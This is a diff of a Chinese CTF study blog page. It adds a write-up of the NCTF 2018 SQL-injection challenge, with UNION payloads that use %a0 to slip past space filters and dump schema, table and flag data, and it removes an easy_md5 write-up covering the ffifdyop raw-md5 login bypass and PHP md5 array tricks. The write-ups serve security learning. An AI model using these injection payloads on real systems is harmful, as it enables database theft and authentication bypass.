@@ -129,7 +129,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">55</span>
+          <span class="site-state-item-count">56</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -163,6 +163,121 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_2.gif">
+      <meta itemprop="name" content="温柔刀">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CTF学习笔记">
+      <meta itemprop="description" content="JNU_WEB">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | CTF学习笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" class="post-title-link" itemprop="url">[NCTF 2018]滴!晨跑打卡</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2025-02-19 17:00:13 / 修改时间：17:57:03" itemprop="dateCreated datePublished" datetime="2025-02-19T17:00:13+08:00">2025-02-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+    <span class="post-meta-item-icon">
+      <i class="far fa-comment"></i>
+    </span>
+    <span class="post-meta-item-text">Waline：</span>
+  
+    <a title="waline" href="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>154</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>SQL注入<img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-171610.png" class="" title="QQ20250219-171610"></p>
+<p>FUZZ看屏蔽什么</p>
+<h1 id="空格-a0"><a href="#空格-a0" class="headerlink" title="空格 %a0"></a>空格 %a0</h1><h1 id="‘’-27"><a href="#‘’-27" class="headerlink" title="‘’ %27"></a>‘’ %27</h1><img src="/2025/02/19/NCTF-2018-%E6%BB%B4-%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/QQ20250219-174605.png" class="" title="QQ20250219-174605">
+
+<p>发现有4列，同时发现后面要加上引号闭合（为啥不用注释呢？）</p>
+<blockquote>
+<p>2、用%a0绕过，输入1’%a0union%a0select%a01,2,3’，发现有4列，同时发现后面要加上引号闭合<br>3、1%27%a0union%a0select%a01,2,3,4%27,回显1,2，3<br>4、查库名：1%27%a0union%a0select%a01,2,(select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),4%27<br>5、查表名：1%27%a0union%a0select%a01,2,(select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema&#x3D;database()),4%27<br>6、查列名：1%27%a0union%a0select%a01,2,(select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name&#x3D;‘pcnumber’),4%27 (报错)<br>7、查字段值：1%27%a0union%a0select%a01,2,(select%a0group_concat(flag)%a0from%a0pcnumber),4%27</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1189,159 +1304,6 @@
 
 
 
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/13/BJDCTF-2020-easy-md5-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_2.gif">
-      <meta itemprop="name" content="温柔刀">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CTF学习笔记">
-      <meta itemprop="description" content="JNU_WEB">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | CTF学习笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/02/13/BJDCTF-2020-easy-md5-1/" class="post-title-link" itemprop="url">[BJDCTF 2020]easy_md5</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2025-02-13 14:25:17 / 修改时间：14:28:14" itemprop="dateCreated datePublished" datetime="2025-02-13T14:25:17+08:00">2025-02-13</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/2025/02/13/BJDCTF-2020-easy-md5-1/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/02/13/BJDCTF-2020-easy-md5-1/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>647</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>2 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>dir扫扫没头绪别管了看下wp</p>
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-133501.png" class="" title="QQ20250213-133501">
-
-<p>原来我们的小提示在输入框的返回响应头里</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
-
-<p>从名为 <code>&#39;admin&#39;</code> 的表中，选择所有列（<code>*</code>），但条件是密码字段的值必须等于一个通过 <code>md5</code> 函数加密后生成的密码。</p>
-<p>然后呢？密码呢？注入看看，好像不会，看看wp</p>
-<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/3001">https://www.nssctf.cn/note/set/3001</a></p>
-<p>当‘ or ’ 后面的值为True是，就能构成万能密码，实现绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;true&#x27;</span><br></pre></td></tr></table></figure>
-
-<h4 id="补充知识点："><a href="#补充知识点：" class="headerlink" title="补充知识点："></a>补充知识点：</h4><p><strong>MySQL的一个特性：</strong></p>
-<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。</p>
-<p>要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true。</p>
-<p>当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password&#x3D;‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1abcdefg&#x27;    ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0abcdefg&#x27;    ---&gt;  False</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;1&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;2&#x27;           ---&gt;  True</span><br><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;0&#x27;           ---&gt;  False</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">for ($i = 0;;) &#123; </span><br><span class="line"> for ($c = 0; $c &lt; 1000000; $c++, $i++)</span><br><span class="line">  if (stripos(md5($i, true), &#x27;\&#x27;or\&#x27;&#x27;) !== false)</span><br><span class="line">   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;;</span><br><span class="line"> echo &quot;.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/</span><br></pre></td></tr></table></figure>
-
-<h1 id="其实我看不懂下面一段"><a href="#其实我看不懂下面一段" class="headerlink" title="*其实我看不懂下面一段"></a>*其实我看不懂下面一段</h1><p>这里提供一个最常用的：<strong>ffifdyop</strong>，该字符串md5加密后若md5()的参数为True时会返回 <strong>‘or’6<trash></strong> (<trash>其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的<trash>会在MySQL将其转换成整型比较时丢掉)</p>
-<p>所以如果这里我们输入ffifdyop，后端的SQL语句会变成：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `admin` where password=&#x27;&#x27;or&#x27;6&lt;trash&gt;&#x27;           ---&gt;  True</span><br></pre></td></tr></table></figure>
-
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135621.png" class="" title="QQ20250213-135621">
-
-<p>这个过滤我会过过过</p>
-<img src="/2025/02/13/BJDCTF-2020-easy-md5-1/QQ20250213-135937.png" class="" title="QQ20250213-135937">
-
-<h3 id="方法-1：利用已知的-MD5-碰撞"><a href="#方法-1：利用已知的-MD5-碰撞" class="headerlink" title="方法 1：利用已知的 MD5 碰撞"></a>方法 1：利用已知的 MD5 碰撞</h3><h3 id="方法-2：利用-PHP-的类型特性（如果条件允许）"><a href="#方法-2：利用-PHP-的类型特性（如果条件允许）" class="headerlink" title="方法 2：利用 PHP 的类型特性（如果条件允许）"></a>方法 2：利用 PHP 的类型特性（如果条件允许）</h3><p>数组绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
-
-<p>在这种情况下：</p>
-<ul>
-<li><code>param1</code> 和 <code>param2</code> 都是数组，它们的值不同（<code>[1] !== [2]</code>）。</li>
-<li><code>md5(param1)</code> 和 <code>md5(param2)</code> 都返回 <code>null</code>，因此 <code>null === null</code> 为 <code>true</code>。</li>
-</ul>
-<p>BP一直抓的是上一次的包所以没成功太尴尬了</p>
-<h1 id="知识点总结：PHPmd5绕过"><a href="#知识点总结：PHPmd5绕过" class="headerlink" title="知识点总结：PHPmd5绕过"></a>知识点总结：PHPmd5绕过</h1><h2 id="两个等号-0e绕过（记录特殊值"><a href="#两个等号-0e绕过（记录特殊值" class="headerlink" title="两个等号 0e绕过（记录特殊值"></a>两个等号 0e绕过（记录特殊值</h2><h2 id="三个等号-数组绕过"><a href="#三个等号-数组绕过" class="headerlink" title="三个等号 数组绕过"></a>三个等号 数组绕过</h2><p>tags:</p>
-<ul>
-<li>md5</li>
-<li>弱比较</li>
-<li>强比较</li>
-<li>数组绕过</li>
-<li>PHP</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
   <nav class="pagination">
     <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/6/"><i class="fa fa-angle-right"></i></a>
   </nav>
@@ -1366,14 +1328,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">25k</span>
+    <span title="站点总字数">27k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:32</span>
+    <span title="站点阅读时长">1:37</span>
   </span>
 </div>
 
